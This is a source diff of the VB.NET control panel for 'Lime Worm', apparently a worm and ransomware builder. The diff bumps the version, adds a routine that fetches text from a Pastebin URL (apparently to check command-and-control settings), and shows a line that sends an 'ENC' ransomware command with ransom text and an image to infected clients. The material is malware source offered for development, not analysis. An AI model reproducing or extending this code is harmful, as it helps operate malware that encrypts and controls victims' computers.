@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on Apr./08/2018        ##
+'##        N Y A N   C A T  |||   Updated on Apr./18/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                      .. Lime Worm v0.5  ..                   ##
+'##                     .. Lime Worm v0.5.2 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -95,7 +95,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.5.1"
+        Me.Text = "Lime Worm v0.5.2"
 
 
         EXE.Enabled = False
@@ -420,7 +420,7 @@ Public Class Form1
                     S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)
             End Select
         Catch ex As Exception
-            MsgBox(ex.Message)
+            Check_PB(ex.Message)
         End Try
 
     End Sub
@@ -955,9 +955,24 @@ Public Class Form1
         End If
     End Sub
 
+    Private Sub ChButton2_Click(sender As Object, e As EventArgs) Handles ChButton2.Click
+        Try
+            Dim t1 As Threading.Thread = New Threading.Thread(AddressOf Check_PB)
+            t1.Start(Pastebin.Text)
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+        End Try
+    End Sub
 
 
-
+    Public Shared Sub Check_PB(ByVal txt As String)
+        Try
+            Dim WC As New Net.WebClient
+            MsgBox(WC.DownloadString(txt))
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+        End Try
+    End Sub
 
 
 #End Region
